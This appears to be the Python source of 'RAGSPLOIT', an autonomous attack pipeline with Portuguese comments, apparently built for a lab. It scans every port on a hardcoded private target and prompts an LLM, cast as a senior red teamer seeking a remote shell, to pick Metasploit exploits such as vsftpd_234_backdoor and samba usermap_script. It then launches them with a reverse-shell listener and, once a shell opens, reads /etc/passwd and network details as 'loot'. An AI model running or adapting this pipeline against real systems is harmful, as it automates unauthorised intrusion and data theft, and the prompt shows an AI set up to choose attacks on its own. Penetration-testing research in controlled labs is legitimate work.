# -*- coding: utf-8 -*-
import time
import json
import re
import sys
import os
import datetime

# Garante que o Python encontre os modulos na pasta src
sys.path.append(os.path.dirname(os.path.abspath(__file__)))
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from src.metasploit_client import MetasploitClient
from src.llm_client import LLMClient
from src.rag_engine import RagEngine
from src.loot import LootManager

# --- CORES ---
C_RED = "\033[91m"
C_GREEN = "\033[92m"
C_YELLOW = "\033[93m"
C_RESET = "\033[0m"
C_BOLD = "\033[1m"

# --- CONFIGURACAO ---
TARGET_IP = "192.168.70.30" 
ATTACKER_IP = "192.168.70.20"
LOOT_DIR = "/app/data/logs"

os.makedirs(LOOT_DIR, exist_ok=True)

try:
    with open("/app/config/target.json", "r") as f:
        data = json.load(f)
        if "target_ip" in data: TARGET_IP = data["target_ip"]
except: pass

class PentestPipeline:
    def __init__(self):
        print("=== INICIALIZANDO PIPELINE AUTONOMO (GEMINI) ===")
        print(f"[*] Alvo Definido: {TARGET_IP}") 
        
        try:
            self.msf = MetasploitClient(password="msfpass", server="192.168.70.20")
            self.llm = LLMClient()
            self.rag = RagEngine()
        except Exception as e:
            print(f"[CRITICO] Falha ao iniciar componentes: {e}")
            sys.exit(1)
            
        self.history = []
        self.banned_modules = []
        self.open_ports = []
        self.session_id = None
        self.evidence = {} 
    
    def cleanup_sessions(self):
        try:
            sessions = self.msf.client.call('session.list')
            if sessions:
                for sid in sessions.keys():
                    self.msf.client.call('session.stop', [str(sid)])
                time.sleep(1)
        except: pass

    def execute_shell_command(self, session_id, command, wait_time=3):
        try:
            cmd_str = command + "\n"
            self.msf.client.call('session.shell_write', [session_id, cmd_str])
            time.sleep(wait_time)
            output = self.msf.client.call('session.shell_read', [session_id])
            if isinstance(output, dict) and 'data' in output:
                return output['data']
            return str(output)
        except: return ""

    def generate_text_report(self):
        """Gera o arquivo TXT detalhado"""
        now = datetime.datetime.now()
        safe_ip = TARGET_IP.replace(".", "_")
        filename = f"{safe_ip}_{now.strftime('%Y-%m-%d_%H-%M-%S')}.txt"
        filepath = os.path.join(LOOT_DIR, filename)

        report = []
        report.append("==================================================")
        report.append(f" RELATORIO DE EXECUCAO - RAGSPLOIT")
        report.append("==================================================")
        report.append(f"DATA: {now.strftime('%d/%m/%Y %H:%M:%S')}")
        report.append(f"ALVO: {TARGET_IP}")
        report.append(f"STATUS: {'SUCESSO (PWNED)' if self.session_id else 'FALHA'}")
        report.append("--------------------------------------------------")
        
        report.append("[1] RECONHECIMENTO (FULL SCAN 1-65535)")
        if self.open_ports:
            report.append(f"Portas Abertas: {', '.join(self.open_ports)}")
        else:
            report.append("Nenhuma porta encontrada.")
        
        report.append("\n[2] MODULOS TESTADOS")
        if not self.history:
            report.append("Nenhum modulo executado.")
        else:
            for item in self.history:
                report.append(f" - {item}")
        
        if self.session_id:
            report.append("\n[3] EVIDENCIAS (LOOT)")
            report.append(f"Sessao ID: {self.session_id}")
            for key, val in self.evidence.items():
                report.append(f"\n> {key}:\n{val.strip()}")
        
        try:
            with open(filepath, "w") as f:
                f.write("\n".join(report))
            print(f"\n{C_GREEN}[LOG] Relatorio salvo em: {filepath}{C_RESET}")
        except Exception as e:
            print(f"{C_RED}[ERRO] Falha ao salvar log: {e}{C_RESET}")

    def phase_1_recon(self):
        print(f"\n>>> [FASE 1] RECONHECIMENTO FULL-RANGE: {TARGET_IP}")
        print(f"{C_YELLOW}[*] Escaneando TODAS as portas (1-65535)... Isso pode levar alguns minutos.{C_RESET}")
        
        # SCAN AGRESSIVO PARA GARANTIR QUE ACHAMOS AS PORTAS
        scan_res = self.msf.run_module("auxiliary", "scanner/portscan/tcp", {
            "RHOSTS": TARGET_IP, 
            "PORTS": "1-65535", 
            "THREADS": "100", 
            "CONCURRENCY": "100",
            "ConnectTimeout": "1", 
            "Jitter": "0"
        })
        
        self.open_ports = []
        if scan_res:
            print(f"\n{C_YELLOW}[DEBUG RAW OUTPUT]: Recebido dados do MSF... processando.{C_RESET}")
            for line in scan_res.split('\n'):
                if "TCP OPEN" in line:
                    match = re.search(r':(\d+)\s+-\s+TCP OPEN', line)
                    if match:
                        p = match.group(1)
                        if p not in self.open_ports:
                            self.open_ports.append(p)
                            print(f"    {C_GREEN}[+] Porta Detectada: {p}{C_RESET}")
        
        if not self.open_ports:
             print(f"{C_RED}[ERRO] Nenhuma porta encontrada.{C_RESET}")
             return []
        
        self.open_ports.sort(key=int)
        print(f"{C_BOLD}[RECON] Total de Portas Abertas: {len(self.open_ports)}{C_RESET}")
        return self.open_ports

    def phase_2_planning(self):
        print(f"\n>>> [FASE 2] PLANEJAMENTO (RAG + AI)")
        if not self.open_ports: return None
        
        ports_summary = ", ".join(self.open_ports[:15]) 
        
        rag_context = "\n".join([d.page_content for d in self.rag.query(f"exploits linux ports {ports_summary}")])
        
        prompt = f"""
        VOCE E UM RED TEAMER SENIOR. OBJETIVO: SHELL REMOTA.
        CONTEXTO RAG: {rag_context}
        ALVO: {TARGET_IP}
        PORTAS ABERTAS: {self.open_ports}
        BLACKLIST: {self.banned_modules}
        
        REGRAS:
        1. Analise as portas e escolha o exploit mais provavel de sucesso.
        2. Portas altas (ex: 8080, 6200, 8888) sao alvos prioritarios (backdoors/webshells).
        3. Priorize vsftpd_234_backdoor (porta 21), samba/usermap_script (139/445), java_rmi (1099).
        
        JSON OBRIGATORIO:
        {{
            "module_type": "exploit",
            "module_name": "caminho/do/modulo",
            "options": {{ "RPORT": <int>, "RHOSTS": "{TARGET_IP}" }},
            "reason": "Explique o porque"
        }}
        """
        try:
            resp = self.llm.ask(prompt, history=self.history).replace("```json", "").replace("```", "").strip()
            plan = json.loads(resp)
            if plan["module_name"].startswith(f"{plan['module_type']}/"):
                plan["module_name"] = plan["module_name"].replace(f"{plan['module_type']}/", "", 1)
            return plan
        except Exception as e:
            print(f"[ERRO AI] {e}")
            return None

    def phase_3_execution(self, plan):
        if not plan: return False
        
        m_type, m_name, opts = plan.get("module_type"), plan.get("module_name"), plan.get("options", {})
        
        print(f"\n>>> [FASE 3] EXECUCAO: {m_type}/{m_name}")
        
        opts["RHOSTS"] = TARGET_IP
        if m_type == "exploit":
            opts["LHOST"] = ATTACKER_IP
            opts["LPORT"] = "4444"
            opts["DisablePayloadHandler"] = "false" 
        
        if not self.msf.verify_module_exists(m_type, m_name):
            print(f"[FALHA] Modulo inexistente.")
            self.banned_modules.append(m_name)
            self.history.append(f"[ERRO] Modulo nao existe: {m_name}")
            return False

        # --- CORRECAO: NOME DA VARIAVEL AGORA ESTA CONSISTENTE ---
        initial_sessions = len(self.msf.client.call('session.list') or {})

        print(f"    [*] Enviando payload... Aguarde...")
        self.msf.run_module(m_type, m_name, opts)
        
        print("    [*] Aguardando 10 segundos para estabilizacao da shell...")
        time.sleep(10)

        current_sessions = self.msf.client.call('session.list') or {}
        new_sid = None
        if len(current_sessions) > initial_sessions:
            all_ids = [int(k) for k in current_sessions.keys()]
            new_sid = str(max(all_ids))
            
        if new_sid:
            print(f"\n{C_GREEN}[***] VITORIA REAL! SHELL OBTIDA (Sessao {new_sid}).{C_RESET}")
            self.session_id = new_sid
            self.history.append(f"[SUCESSO] {m_name} -> Sessao {new_sid}")
            LootManager.log_success(TARGET_IP, m_name, f"Sessao {new_sid}")
            return True
        else:
            print(f"{C_RED}[FAIL] O exploit rodou mas NENHUMA NOVA sessao foi criada.{C_RESET}")
            self.history.append(f"[FALHA] {m_name} -> Sem sessao")
            self.banned_modules.append(m_name)
            return False

    def phase_4_post_exploitation(self):
        if not self.session_id: return
        print(f"\n>>> [FASE 4] COLETA DE EVIDENCIAS")
        
        uid = self.execute_shell_command(self.session_id, "id; whoami")
        self.evidence["UID"] = uid.strip()
        LootManager.update_evidence(TARGET_IP, "uid", uid.strip())
        
        passwd = self.execute_shell_command(self.session_id, "head -n 5 /etc/passwd")
        self.evidence["PASSWD"] = passwd.strip()
        LootManager.update_evidence(TARGET_IP, "passwd", passwd.strip())
        
        net = self.execute_shell_command(self.session_id, "ifconfig || ip addr")
        self.evidence["NETWORK"] = net.strip()
        LootManager.update_evidence(TARGET_IP, "network", net.strip())

        print("[SUCESSO] Evidencias coletadas.")

    def run(self):
        self.cleanup_sessions()
        
        # 1. Recon (Full Scan)
        found_ports = self.phase_1_recon()
        
        if not found_ports:
            print(f"\n{C_RED}[ERRO FATAL] Nenhuma porta aberta encontrada.{C_RESET}")
            self.generate_text_report()
            return

        # 2. Attack Loop
        success = False
        for i in range(5):
            print(f"\n=== CICLO {i+1} ===")
            plan = self.phase_2_planning()
            if self.phase_3_execution(plan):
                success = True
                break
            time.sleep(5)
            
        if success:
            time.sleep(5)
            self.phase_4_post_exploitation()
            print("\n=== OPERACAO COMPLETA ===")
        else:
            print("\n=== FALHA NA OPERACAO ===")
        
        self.generate_text_report()

if __name__ == "__main__":
    pipeline = PentestPipeline()
    pipeline.run()